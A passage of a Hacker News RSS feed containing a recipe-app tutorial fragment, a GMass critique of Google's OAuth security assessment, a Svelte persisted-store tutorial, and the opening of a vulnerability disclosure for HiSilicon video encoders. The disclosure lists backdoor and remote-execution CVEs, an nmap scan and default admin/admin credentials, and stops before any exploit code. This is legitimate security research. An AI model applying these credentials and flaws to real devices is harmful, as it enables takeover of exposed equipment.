id="00b7"><code><strong>RecipeViewController()</strong></code> :</li></ul><p id="e0af">This is where we will show the recipe with the list of products needed to cook or prepare the homemade version.</p><h2 id="6a72">Setup ViewController():</h2><p id="9bdb">Instantiate the controller‚Äôs properties:</p><ul><li id="0ed8">Instantiate the model class <code>SeedImagesAccurate</code>. When you add the <code>.mlmodel</code> file in your project, Xcode will parse it and automatically generate a helper class.</li><li id="6bc0">Instantiate an object of type <code>VNCoreMLReqest</code> that will handle the Core ML model predictions.</li><li id="9a78">Instantiate an object of type <code>VideoCapture</code> ‚Ä¶</li></ul></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://heartbeat.fritz.ai/create-homemade-recipes-of-your-favorite-products-on-ios-using-fritz-ai-studio-c2c1a1fcc16d">https://heartbeat.fritz.ai/create-homemade-recipes-of-your-favorite-products-on-ios-using-fritz-ai-studio-c2c1a1fcc16d</a></em></p>]]>
            </description>
            <link>https://heartbeat.fritz.ai/create-homemade-recipes-of-your-favorite-products-on-ios-using-fritz-ai-studio-c2c1a1fcc16d</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516940</guid>
            <pubDate>Fri, 18 Sep 2020 14:07:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WTF: Google‚Äôs OAuth verification process and security assessment]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24516706">thread link</a>) | @JaneKCall
<br/>
September 18, 2020 | https://www.gmass.co/blog/google-oauth-verification-security-assessment/ | <a href="https://web.archive.org/web/*/https://www.gmass.co/blog/google-oauth-verification-security-assessment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-9167">
	<!-- <header class="entry-header"> -->
					<!-- <div class="entry-meta"> -->
							<!-- </div> -->
			<!-- </header> -->

	
	<div>
		<p>Last October, <a href="https://cloud.google.com/blog/products/g-suite/elevating-user-trust-in-our-api-ecosystems">Google announced that it would start being more stringent</a> with software vendors <strong>building apps on top of the Gmail API</strong>. Specifically,&nbsp;developers using a ‚Äúrestricted‚Äù or ‚Äúsensitive‚Äù Gmail API scope would be subject to additional scrutiny and have to pay a fee of $15,000 ‚Äì $75,000 <em>or more</em> to have a third party security assessment done. GMass leverages the power of the Gmail API to perform its magic, and so GMass has been subject to these measures.</p>
<p>Since Google‚Äôs announcement, the web&nbsp;has become rife with stories of frustration amongst smaller companies and independent developers who simply cannot afford the fee.&nbsp;This&nbsp;new policy stands to kill innovation, be the obstacle to side projects, and overall, make Gmail less useful. One of the primary reasons Gmail has been the email platform of choice for startups and tech companies is that it‚Äôs been extensible. There are&nbsp;<a href="https://www.producthunt.com/e/apps-for-gmail-email">hundreds, if not thousands,&nbsp;of extensions&nbsp;for Gmail</a>, one of which is GMass, that&nbsp;add functionality and make&nbsp;Gmail more useful than the base product. <em>Most of these applications&nbsp;will disappear.</em> Unless a product has reached the point of business sustainability, it won‚Äôt be worth it for most developers to pay the fee and go through the security process (which by the way, will likely cost more than the fee paid, because of development time necessary for remediation).</p>
<p>Well known extensions and Gmail apps like Boomerang, Yesware, Mixmax, and Mailtrack will likely pay the fee and succumb to the new governance, but smaller players like <a href="https://blog.context.io/context-io-deprecation-notice-ce8b77e6e477">Context.io</a> and <a href="https://www.voice2biz.com/oauth-2-0-for-google-apis-3rd-party-audit-costs-require-emailmonkey-to-shutdown/">EmailMonkey have already announced their plans to shut down</a>. I‚Äôve also decided to shut down my other Gmail extension, Wordzen, because the fee is too high to be worth it for Wordzen.</p>
<p>This <a href="https://www.theregister.co.uk/2019/02/11/google_gmail_developer/">article from The Register</a>&nbsp;profiles two makers of Gmail apps, Leave Me Alone and Clean Email,&nbsp;and their frustrations with the new requirements.</p>
<p>Even a popular service like <a href="https://help.ifttt.com/hc/en-us/articles/360020249393-Important-update-about-Gmail-on-IFTTT">IFTTT&nbsp;is caving and reducing&nbsp;its Gmail functionality</a>.</p>
<h3>My stance</h3>
<ol>
<li>I‚Äôm not happy about it, but given the substantial GMass user base, we‚Äôre beginning the process of the security audit. You can follow my <a href="https://www.gmass.co/blog/live-updates-google-oauth-verification-security/">live updates of the OAuth verification process</a>.</li>
<li>I‚Äôm&nbsp;a proponent&nbsp;for greater security and protection of user data, but asking software developers to pay the security fee is ludicrous. Google should pay the fee on behalf of its developers (explanation below).</li>
<li>The opportunity is rife for a new email platform to make a dent in Gmail‚Äôs marketshare.</li>
<li>Prices for all Gmail apps, including GMass, will rise to cover the cost of the annual security assessment.</li>
<li>Google is grasping for straws when justifying making the developers pay. In response to the question ‚Äú<b>Why is Google asking apps to pay for the security assessment?‚Äù </b>they state, ‚ÄúAs we‚Äôve pre-selected industry leading assessors, <strong>the letter of assessment your app will receive can be used for other certifications or customer engagements</strong> where a security assessment is needed.‚Äù <em>Gee thanks, Google, for&nbsp;making it easier for us to get more customer engagements.</em></li>
<li>Google‚Äôs support for developers who build Gmail apps has been poor, and&nbsp;the manner in which&nbsp;this issue is being handled is being done callously. Questions to the OAuth verification team go unanswered for long periods of time. Stack Overflow is <a href="https://stackoverflow.com/questions/tagged/gmail-api">littered with questions about the Gmail API</a>, mostly which go unanswered, <a href="https://developers.google.com/gmail/api/support">despite Google pointing developers to this area</a>. Google has been playing favorites with<a href="https://gsuite.google.com/marketplace/category/works-with-gmail"> Gmail Add-ons</a>, allowing only some to work on iOS while <a href="https://developers.google.com/gsuite/add-ons/guides/restrictions">claiming that iOS isn‚Äôt supported</a>, and not providing any context for its decisions. Additionally, Chrome extensions for Gmail have never been officially sanctioned,&nbsp;although when Gmail launched its new UI last year, it did inform all extension makers of the upcoming changes and provided test accounts. It‚Äôs clear that it‚Äôs up to developers to solve their own issues and work around Google‚Äôs platform shortcomings.</li>
</ol>
<h3>Conflict and Confusion</h3>
<p>There is also conflict and confusion amongst the information released by Google.</p>
<p><strong>Does this process only affect you if your users include gmail.com accounts, or do you have to go through the process even if you just take on G Suite users?</strong></p>
<p>The language in the announcements seem to indicate that&nbsp;this only affects gmail.com consumer accounts wanting access to an app.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/04/Screenshot-2019-04-30-17.32.31.png" alt="" width="1356" height="234">The&nbsp;use of the word ‚Äúmy‚Äù, however, in the question is confusing. It makes the question seem to apply to internal accounts only, those that are owned by the developer of the app. But then the answer references how G Suite administrators can control access, which implies that all external G Suite accounts are included in the group that are not impacted.</p>
<p>In the&nbsp;detailed FAQ about who can skip the review process, one would hope that for consistency with the above that it would say ‚ÄúThose apps that only service G Suite accounts and not consumer gmail.com accounts‚Äù&nbsp;but it doesn‚Äôt. Hmm.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/04/Screenshot-2019-04-30-17.34.49.png" alt="" width="1568" height="658"></p>
<p>Further in the FAQ, we find:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.36.05.png" alt="" width="1358" height="294">The first paragraph references ‚ÄúGoogle Accounts outside of your organization‚Äù which I interpret to include G Suite accounts outside of your organization. But then the second paragraph says that if you don‚Äôt verify, ‚Äúaccess for new users will be disabled‚Äù and ‚Äúexisting grants for consumer accounts will be revoked‚Äù. I interpret that to mean that no new G Suite nor gmail.com users will be able to OAuth connect to your app, but existing G Suite users will still be able to.</p>
<p>Lastly, there‚Äôs this bit:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.37.35.png" alt="" width="1522" height="342">I‚Äôm thoroughly confused at this point.</p>
<p><strong>What happens if you choose to not go through the process? Will your app just show ‚ÄúUnverified‚Äù on the OAuth consent screen, or will it not have access to certain Gmail API scopes altogether?</strong></p>
<p>The documentation is also unclear on this issue. In the User Data Policy, we find:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.46.43.png" alt="" width="1828" height="478"></p>
<p>but this seems to conflict with what‚Äôs shown above:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.36.05.png" alt="" width="1358" height="294"></p>
<p>Finally this text under the ‚ÄúSensitive Scope Verification‚Äù section seems to indicate that the only consequence of not having your app verified is that users will see that it‚Äôs Unverified.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.49.53.png" alt="" width="1458" height="488"></p>
<p>However, there‚Äôs no equivalent question under the ‚ÄúRestricted Scope Verification‚Äù section:</p>
<figure id="attachment_4202" aria-describedby="caption-attachment-4202"><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.56.27.png" alt="" width="1534" height="1282"><figcaption id="caption-attachment-4202">They really should include the question: ‚ÄúWhat happens if I don‚Äôt verify my app?‚Äù</figcaption></figure>
<p>It would&nbsp;be preferable for the entire developer community if the only consequence of not verifying a sensitive scope app is that users see the ‚ÄúUnverified‚Äù designation when connecting their accounts because it allows users to still use their apps. Personally I&nbsp;wouldn‚Äôt mind if GMass users go to connect their accounts and see that the app is ‚Äúunverified‚Äù,&nbsp;if it weren‚Äôt for the <a href="https://www.dropbox.com/s/v2ipv5oot4qqtwc/Screenshot%202019-05-01%2001.54.43.png?dl=0">100 user cap that is imposed on Unverified Apps</a>. But again, this is only clear for sensitive scope apps and not restricted scope apps.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.54.43.png" alt="" width="1568" height="614"></p>
<h3>The scope of the security audit</h3>
<p>In the <a href="https://support.google.com/cloud/answer/9110914">FAQ</a>, Google states ‚Äúwe are requiring apps that store data on non-Google servers to demonstrate a minimum level of capability in handling data securely and deleting user data upon user request.‚Äù But deeper in the FAQ, the&nbsp;audit also includes developer‚Äôs code deployment practices, which seems to go beyond a minimal level in capability in handling data securely.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/google-oauth-security-audit-web.png" alt="" width="518" height="1371"><br>
<em>Google is in a position of power over its third party developers.</em> After all, where are the developers going to go? We‚Äôve all invested substantially into building our products, many of us make a living off of what we‚Äôve built, so we if we don‚Äôt play by the new rules, it would mark an end to our careers. We could go and build on Outlook.com‚Äôs API instead, but with just two players ‚Äî Google and Microsoft ‚Äî dominating the email ecosystem, there‚Äôs no guarantee that Microsoft won‚Äôt implement the same policies. Such is the risk of building a product on top of someone else‚Äôs.</p>
<h3>Why Google&nbsp;should pay the fee instead</h3>
<p>They can afford to, and it offers a checks and balances between the security firms and Google that doesn‚Äôt exist right now. While developers benefit from building software on top of Gmail, Google too derives benefit from attracting customers to a product that has been made better by all of its third party developers. There are users of Gmail and G Suite that would NOT be users if it weren‚Äôt for their loyalty to a particular third party app. I know for certain that in GMass‚Äôs case, we‚Äôve&nbsp;brought users to G Suite because they wanted to use GMass.</p>
<h3>Resources on&nbsp;the new Google OAuth scope policy</h3>
<p>Google‚Äôs <a href="https://cloud.google.com/blog/products/g-suite/elevating-user-trust-in-our-api-ecosystems">original announcement</a> <span>(cloud.google.com)</span>.</p>
<p>The <a href="https://developers.google.com/terms/api-services-user-data-policy">user data policy</a> <span>(developers.google.com)</span>.</p>
<p>Detailed <a href="https://support.google.com/cloud/answer/9110914?hl=en&amp;ref_topic=3473162">FAQ</a> on the verification process and the security assessment <span>(support.google.com)</span>.</p>
<p>Indie Hackers <a href="https://www.indiehackers.com/forum/psa-new-google-policy-creates-15k-barrier-to-entry-for-apps-using-the-gmail-api-08070e6e4c">discussion</a> of the issue <span>(indiehackers.com)</span>.</p>
<p><a href="https://groups.google.com/forum/#!topic/inboxsdk/6NLvQL-5bic">Inbox SDK discussion</a> on the issue <span>(groups.google.com)</span>.</p>
<div itemtype="http://schema.org/Person" itemscope="" itemprop="author"><p><img alt="" src="https://secure.gravatar.com/avatar/836da7a343d034a72cb44fb28580efe6?s=100&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/836da7a343d034a72cb44fb28580efe6?s=200&amp;d=mm&amp;r=g 2x" height="100" width="100" itemprop="image"></p><div><p>Ajay is the founder of GMass and has been developing email sending software for 20 years.</p></div></div></div><!-- .entry-content -->

	<!-- <footer class="entry-footer"> -->
			<!-- </footer> -->

</article></div>]]>
            </description>
            <link>https://www.gmass.co/blog/google-oauth-verification-security-assessment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516706</guid>
            <pubDate>Fri, 18 Sep 2020 13:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Passive user preferences with persisted stores in Svelte]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24516485">thread link</a>) | @jerodsanto
<br/>
September 18, 2020 | https://pace.dev/blog/2020/09/09/simple-user-preferences-with-persisted-stores-svelte.html | <a href="https://web.archive.org/web/*/https://pace.dev/blog/2020/09/09/simple-user-preferences-with-persisted-stores-svelte.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div uk-lightbox="toggle:.lightbox-toggle">
<h2 id="the-case-for-passive-preferences-1">The case for passive preferences</h2><p>In <a href="https://pace.dev/" rel="nofollow">Pace.dev</a> users customise their experience passively as they interact with the UI.</p>
<p>We achieve this by remembering their settings for next time in the browser‚Äôs data store. <strong>This little trick turns out to deliver a pretty powerful user experience punch.</strong></p>
<p>A few examples of this include our <em>Send on enter</em> toggle in comment boxes, the <em>light/dark mode</em> setting, and the <em>number of cards</em> to display per page.</p>
<p>If the user picks ten cards per page, they are probably on a smaller device. Pace will remember to show them ten cards per page for the foreseeable. Since the storage is in the browser, the same account on different machines will have different preferences by default - which works well for us in our case.</p>
<p>There might be something interesting that a user experience expert could tell us about how this behaviour mirrors the real world; if you open a drawer, it stays open until you close it.</p>
<p>It is a very effective <em>passive</em> way that users can set their preferences.</p>
<h2 id="stores-in-svelte-2">Stores in Svelte</h2>
<p>Stores in Svelte provide a mechanism by which components can <em>subscribe</em> to changes in data. So we can put the <em>number of cards</em> value into a store, and any component that cares about that data will be notified when it changes.</p>
<p>Svelte adds some nice (and more importantly, easy to learn) syntactic sugar around stores, so <em>subscribing</em> is as simple as mentioning the store with a <code>$</code> prefix.</p>
<ul>
<li>You can learn more about stores in Svelte at <a href="https://svelte.dev/docs#svelte_store" rel="nofollow">https://svelte.dev/docs#svelte_store</a></li>
</ul>
<h3 id="using-stores-in-svelte-3">Using stores in Svelte</h3>
<p>In Pace, we have a <code>stores.svelte</code> file that contains code like this:</p>
<pre><code>&lt;script lang='ts' context='module'&gt;

	import { writable } from 'svelte/store'
	export const hasUnreadItems = writable(false)

&lt;/script&gt;
</code></pre>
<p>The <code>writable</code> function creates a mutable store.</p>
<p>In our components we import <code>hasUnreadItems</code> and refer to it in template code with the <code>$</code> prefix.</p>
<pre><code>&lt;script lang='ts'&gt;
	import { hasUnreadItems } from '/stores.svelte'
&lt;/script&gt;
{#if $hasUnreadItems}
	&lt;div&gt;...&lt;/div&gt;
{/if}
</code></pre>
<p>In our <code>App.svelte</code> we have some code running that is checking for unread items.</p>
<p>When the event occurs, we use the <code>set</code> method to update the store.</p>
<pre><code>import { hasUnreadItems } from '/stores.svelte'

function onHasUnreadItems() {
	hasUnreadItems.set(true)
}
</code></pre>
<p>When we call <code>hasUnreadItems.set</code>, the <code>if</code> condition in the component above will be reevaluated, and the app will update accordingly.</p>
<h3 id="making-stores-persistent-4">Making stores persistent</h3>
<p>Stores in Svelte are in-memory, and so are scoped to the page.</p>
<p>We wanted to persist the values between page refreshes in the
simplest way possible.</p>
<p>The store API in Svelte is very minimalistic, which makes it easy to implement
ourselves, and even build functionality on top of other stores.</p>
<p>Our <code>persistable</code> function uses a store internally and provides alternative
functions for <code>set</code> and <code>update</code> which call out to other functions to persist and
retrieve the values.</p>
<p>In this case, we store the values in the IndexedDB.</p>
<p>Here‚Äôs the entire code in JavaScript:</p>
<pre><code>/*
 * Svelte persistent store that saves to IndexedDB.
 * 
 * Usage, store.js:
 * export const count = persistable('count', 0)
 */
export function persistable(key, defaultValue) {
	let currentValue = defaultValue
	const { subscribe, set, update } = writable(defaultValue)
	try {
		getUserPreference(key).then(persisted =&gt; {
			if (persisted &amp;&amp; persisted.Value !== undefined) {
				currentValue = persisted.Value
				set(persisted.Value)
			}
		})
	} catch (error) {
		console.warn(error)
	}
	function persistentSet(value) {
		currentValue = value
		set(value)
		try {
			putUserPreference(key, value)
		} catch (error) {
			console.warn(error)
		}
	}
	function persistentUpdate(fn) {
		persistentSet(fn(currentValue))
	}
	return {
		subscribe,
		set: persistentSet,
		update: persistentUpdate,
	}
}
</code></pre>
<p>By intercepting calls to the store, we are able to do additional work before passing execution to the store underneath (the one we created when we called <code>writable</code>).</p>
<p>We get the usual behaviour of the store, as well as calls out to our own persistence functions.</p>
<p>Any errors that occur are warned to the console, but we don‚Äôt worry too much; the store will continue to work as normal, it‚Äôs just the persistence that has failed. At least it gracefully degrades on browsers without IndexedDB support.</p>
<h3 id="persisting-values-5">Persisting values</h3>
<p>The <code>getUserPreference</code> and <code>putUserPreference</code> functions make up a promise based API that persists, and looks up values by a <code>key</code>.</p>
<p>These days developers have lots of options when it comes to storing data in the browser. We built our solution on top of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API" rel="nofollow">IndexedDB browser API</a> using <a href="https://dexie.org/" rel="nofollow">Dexie.js</a> out of a technical curiosity, and are pretty happy with it.</p>
<pre><code>// create a database
let userPreferencesDB = new Dexie('pace-user-preferences')
userPreferencesDB.version(1).stores({
	'user_preferences': '[key],value',
})

export function putUserPreference(key, value) {
	userPreferencesDB['user_preferences'].put({
		key: key,
		value: value,
	})
}

export function getUserPreference(key) {
	return userPreferencesDB['user_preferences'].get([key])
}
</code></pre>
<blockquote>
<p>You could easily write different <code>putUserPreference</code> and <code>getUserPreference</code> implementations to persist the values elsewhere - even on a remote server if you want to sync across devices.</p>
</blockquote>
<h2 id="using-our-new-api-6">Using our new API</h2>
<p>The <code>persistable</code> function mirrors Svelte‚Äôs stores API, which makes it a drop-in replacement for any calls to <code>writable</code>.</p>
<p>To make a store persist, all we need to do is create it with a call to <code>persistable</code> instead, passing in a unique string key for each one.</p>
<hr>
<h2>
Learn more about what we're doing at Pace.
</h2>
<p>
A lot of our blog posts come out of the technical work behind a project we're
working on called Pace.
</p>
<p>
We were frustrated by communication and project management tools that interrupt your flow and
overly complicated workflows turn simple tasks, hard. <span>So we decided to build Pace.</span>
</p>
<p>
Pace is a new minimalist project management tool for tech teams. We promote <strong>asynchronous
communication</strong> by default, while allowing for those times when you really need to chat.
</p>
<p>
We shift the way work is assigned by allowing only <strong>self-assignment</strong>, creating a more empowered team
and protecting the attention and focus of devs.
</p>
<p>
We're currently live and would love you to try it and share your
opinions on what project management tools should and shouldn't do.
</p>
<p>
<strong>What next?</strong>
<a href="https://pace.dev/">Start your 14 day free trial to see if Pace is right for your team</a>
</p>
</div><p>
Thank you, <strong>we don't do ads</strong> so we rely on you to spread the word.
</p></div>]]>
            </description>
            <link>https://pace.dev/blog/2020/09/09/simple-user-preferences-with-persisted-stores-svelte.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516485</guid>
            <pubDate>Fri, 18 Sep 2020 13:29:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Backdoors and other vulnerabilities in HiSilicon based hardware video encoders]]>
            </title>
            <description>
<![CDATA[
Score 185 | Comments 62 (<a href="https://news.ycombinator.com/item?id=24516453">thread link</a>) | @blablablub
<br/>
September 18, 2020 | https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/ | <a href="https://web.archive.org/web/*/https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>15 Sep 2020</span></p><p><img src="https://kojenov.com/assets/2020-09-15-encoders/010-title-bug.png" alt="bug"></p>

<hr>

<p><strong>Update 2020-09-17:</strong> Huawei <a href="https://www.huawei.com/en/psirt/security-notices/2020/huawei-sn-20200917-01-hisilicon-en">issued a statement</a> saying that none of the vulnerabilities have been introduced by HiSilicon chips and SDK packages. I will update this article as more information comes in.</p>

<hr>

<p>This article discloses critical vulnerabilities in IPTV/H.264/H.265 video encoders based on HiSilicon hi3520d hardware. The vulnerabilities exist in the application software running on these devices. All vulnerabilities are exploitable remotely and can lead to sensitive information exposure, denial of service, and remote code execution resulting in full takeover of the device. With multiple vendors affected, and no complete fixes at the time of the publication, these encoders should only be used on fully trusted networks behind firewalls. I hope that my detailed write-up serves as a guide for more security research in the IoT world.</p>

<!--more-->

<ul id="markdown-toc">
  <li><a href="#summary" id="markdown-toc-summary">Summary</a></li>
  <li><a href="#background" id="markdown-toc-background">Background</a></li>
  <li><a href="#hardware" id="markdown-toc-hardware">Hardware</a></li>
  <li><a href="#network-recon" id="markdown-toc-network-recon">Network recon</a>    <ul>
      <li><a href="#23---telnet" id="markdown-toc-23---telnet">23 - telnet</a></li>
      <li><a href="#80-8086---web-application" id="markdown-toc-80-8086---web-application">80, 8086 - web application</a></li>
      <li><a href="#554-8554---rtsp" id="markdown-toc-554-8554---rtsp">554, 8554 - RTSP</a></li>
      <li><a href="#1935---rtmp" id="markdown-toc-1935---rtmp">1935 - RTMP</a></li>
      <li><a href="#5150---serial-to-tcp" id="markdown-toc-5150---serial-to-tcp">5150 - serial to TCP</a></li>
      <li><a href="#9588---another-web-server" id="markdown-toc-9588---another-web-server">9588 - another web server</a></li>
    </ul>
  </li>
  <li><a href="#firmware-analysis" id="markdown-toc-firmware-analysis">Firmware analysis</a>    <ul>
      <li><a href="#content" id="markdown-toc-content">Content</a></li>
      <li><a href="#password-file-and-telnet-access" id="markdown-toc-password-file-and-telnet-access">Password file and telnet access</a></li>
    </ul>
  </li>
  <li><a href="#local-recon" id="markdown-toc-local-recon">Local recon</a>    <ul>
      <li><a href="#the-base-system" id="markdown-toc-the-base-system">The base system</a></li>
      <li><a href="#processes" id="markdown-toc-processes">Processes</a></li>
      <li><a href="#ports" id="markdown-toc-ports">Ports</a></li>
      <li><a href="#dumping-the-file-system" id="markdown-toc-dumping-the-file-system">Dumping the file system</a></li>
    </ul>
  </li>
  <li><a href="#reverse-engineering" id="markdown-toc-reverse-engineering">Reverse engineering</a>    <ul>
      <li><a href="#modifying-the-boot" id="markdown-toc-modifying-the-boot">Modifying the boot</a></li>
      <li><a href="#remote-debugging" id="markdown-toc-remote-debugging">Remote debugging</a></li>
      <li><a href="#decompiling" id="markdown-toc-decompiling">Decompiling</a></li>
    </ul>
  </li>
  <li><a href="#vulnerabilities-and-exploits" id="markdown-toc-vulnerabilities-and-exploits">Vulnerabilities and exploits</a>    <ul>
      <li><a href="#backdoor-password-cve-2020-24215" id="markdown-toc-backdoor-password-cve-2020-24215">Backdoor password (CVE-2020-24215)</a></li>
      <li><a href="#root-access-via-telnet-cve-2020-24218" id="markdown-toc-root-access-via-telnet-cve-2020-24218">root access via telnet (CVE-2020-24218)</a></li>
      <li><a href="#arbitrary-file-disclosure-via-path-traversal-cve-2020-24219" id="markdown-toc-arbitrary-file-disclosure-via-path-traversal-cve-2020-24219">Arbitrary file disclosure via path traversal (CVE-2020-24219)</a></li>
      <li><a href="#unauthenticated-file-upload-cve-2020-24217" id="markdown-toc-unauthenticated-file-upload-cve-2020-24217">Unauthenticated file upload (CVE-2020-24217)</a></li>
      <li><a href="#arbitrary-code-execution-by-uploading-malicious-firmware" id="markdown-toc-arbitrary-code-execution-by-uploading-malicious-firmware">Arbitrary code execution by uploading malicious firmware</a></li>
      <li><a href="#arbitrary-code-execution-via-command-injection" id="markdown-toc-arbitrary-code-execution-via-command-injection">Arbitrary code execution via command injection</a></li>
      <li><a href="#buffer-overflow-definite-dos-and-potential-rce-cve-2020-24214" id="markdown-toc-buffer-overflow-definite-dos-and-potential-rce-cve-2020-24214">Buffer overflow: definite DoS and potential RCE (CVE-2020-24214)</a></li>
      <li></li>
    </ul>
  </li>
  <li><a href="#disclosure" id="markdown-toc-disclosure">Disclosure</a>    <ul>
      <li><a href="#affected-vendors" id="markdown-toc-affected-vendors">Affected vendors</a></li>
      <li><a href="#coordinated-disclosure" id="markdown-toc-coordinated-disclosure">Coordinated disclosure</a></li>
      <li><a href="#remediation" id="markdown-toc-remediation">Remediation</a></li>
    </ul>
  </li>
  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
  <li><a href="#exploit-demos" id="markdown-toc-exploit-demos">Exploit demos</a></li>
  <li><a href="#exploit-scripts" id="markdown-toc-exploit-scripts">Exploit scripts</a></li>
  <li><a href="#links" id="markdown-toc-links">Links</a></li>
</ul>

<h2 id="summary">Summary</h2>

<p>The following vulnerabilities were identified:</p>

<ul>
  <li>Critical
    <ul>
      <li>Full admin interface access via backdoor password (CVE-2020-24215)</li>
      <li>root access via telnet (CVE-2020-24218)</li>
      <li>Arbitrary file disclosure via path traversal (CVE-2020-24219)</li>
      <li>Unauthenticated file upload (CVE-2020-24217)
        <ul>
          <li>Arbitrary code execution via malicious firmware upload</li>
          <li>Arbitrary code execution via command injection</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>High
    <ul>
      <li>Denial of service via buffer overflow (CVE-2020-24214)</li>
    </ul>
  </li>
  <li>Medium
    <ul>
      <li>Unauthorized RTSP video stream access (CVE-2020-24216)</li>
    </ul>
  </li>
</ul>

<p>See <a href="https://www.kb.cert.org/vuls/id/896979">CERT/CC vulnerability note VU#896979</a></p>

<p>During my research I had physical access to several devices from the following vendors: <a href="http://szuray.com/">URayTech</a>, <a href="https://jtechdigital.com/product/jtech-ench4-0220/">J-Tech Digital</a>, and <a href="https://www.provideoinstruments.com/iptv-encoders">Pro Video Instruments</a>. I performed my research initially on URayTech, then confirmed vulnerabilities in the other two vendors.</p>

<p>There is at least a dozen of different vendors that manufacture and sell very similar devices. By analyzing product documentation and firmware update packages, I‚Äôve got a high level of confidence those devices were also affected by most, if not all, vulnerabilities listed here. Here is an [incomplete] list of these additional vendors: <a href="http://www.networktechinc.com/h264-hdmi-encoder.html"><em>Network Technologies Incorporated (NTI)</em></a>, <a href="https://www.oupree.com/IP-Video-Encoder-Decoder/"><em>Oupree</em></a>, <a href="http://www.szmine.com/Video_Encoder/"><em>MINE Technology</em></a>, <a href="https://www.blankom.de/products/irenis-ip-encoder-streamer/"><em>Blankom</em></a>, <a href="https://www.iseevy.com/product-category/video-encoder/"><em>ISEEVY</em></a>, <a href="https://www.orivision.com.cn/c/h264-hdmi-encoder_0017"><em>Orivision</em></a>, <a href="https://www.procoderhd.com/">WorldKast/procoder</a>, <a href="http://www.digicast.cn/en/product.asp?pType=222">Digicast</a></p>

<p>It is my understanding that most of these devices are intended to be used behind NAT/firewall. However, I was able to utilize <a href="http://shodan.io/">shodan.io</a> to identify several hundred devices on the public internet, all likely to be exploitable by an anonymous remote attacker.</p>

<h2 id="background">Background</h2>

<p>Hardware video encoders are used for video streaming over IP networks. They convert raw video signals (such as analog, SDI, HDMI) to H.264 or H.265 streams and send them to a video distribution network (YouTube, Twitch, Facebook,‚Ä¶) or let the users watch the video directly via RTSP, HLS, etc. Normally, these encoders have a web interface to allow the administrator to configure networking, encoding parameters, streaming options, and so on. Many such devices on the market today are based on <a href="http://www.hisilicon.com/en/">HiSilicon</a> (a Huawei brand) hi3520d ARM SoC running a special Linux distribution called HiLinux, with a set of user-space utilities and a custom web application on top.</p>

<p>Security research on HiSilicon devices has been done in the past. Here are some existing publications:</p>

<ul>
  <li><a href="https://habr.com/ru/post/173501/">Root shell in IP cameras</a> (in Russian) by Vladislav Yarmak, 2013. The research uncovered the root password allowing root shell access over telnet.</li>
  <li><a href="https://github.com/tothi/pwn-hisilicon-dvr">HiSilicon DVR hack</a> by Istvan Toth, 2017. This research targeted DVR/NVR devices, and uncovered a root shell access with elevated privileges, a backdoor password, a file disclosure via path traversal, and an exploitable buffer overflow.</li>
  <li><a href="https://habr.com/en/post/486856/">Full disclosure: 0day vulnerability (backdoor) in firmware for Xiaongmai-based DVRs, NVRs and IP cameras</a> by Vladislav Yarmak. This research uncovered a very interesting ‚Äúport knocking‚Äù backdoor allowing a remote attacker to start the telnet, and then log in with one of the several known passwords.</li>
</ul>

<p>While the streaming video encoders may share the same hardware architecture and the underlying Linux system with the above devices, my research targets the <strong>admin web application specific to the video encoders</strong> and does not overlap with the prior work.</p>

<h2 id="hardware">Hardware</h2>

<p>Here is a few pictures of one of the devices I had an opportunity to test.
<img src="https://kojenov.com/assets/2020-09-15-encoders/050-encoder.jpg" alt="hardware">
Physical ports
<img src="https://kojenov.com/assets/2020-09-15-encoders/060-encoder.jpg" alt="hardware">
Top cover off. The right side, from top to bottom: LAN, HDMI out, reset, HDMI in, LEDs, audio in
<img src="https://kojenov.com/assets/2020-09-15-encoders/070-encoder.jpg" alt="hardware">
Let‚Äôs plug this thing in, connect to network, and start exploring!</p>

<h2 id="network-recon">Network recon</h2>

<p>A simple <code>nmap</code> scan reports the following open ports:</p>

<div><div><pre><code>$ nmap -p 1-65535 encoder
...
PORT     STATE SERVICE
23/tcp   open  telnet
80/tcp   open  http
554/tcp  open  rtsp
1935/tcp open  rtmp
5150/tcp open  atmp
8086/tcp open  d-s-n
8554/tcp open  rtsp-alt
9588/tcp open  unknown
</code></pre></div></div>

<h3 id="23---telnet">23 - telnet</h3>

<p>Telnet displays the login prompt, but the password is unknown at this point:</p>



<h3 id="80-8086---web-application">80, 8086 - web application</h3>

<p>Both ports serve the main admin web interface. The default credentials are <strong>admin/admin</strong>
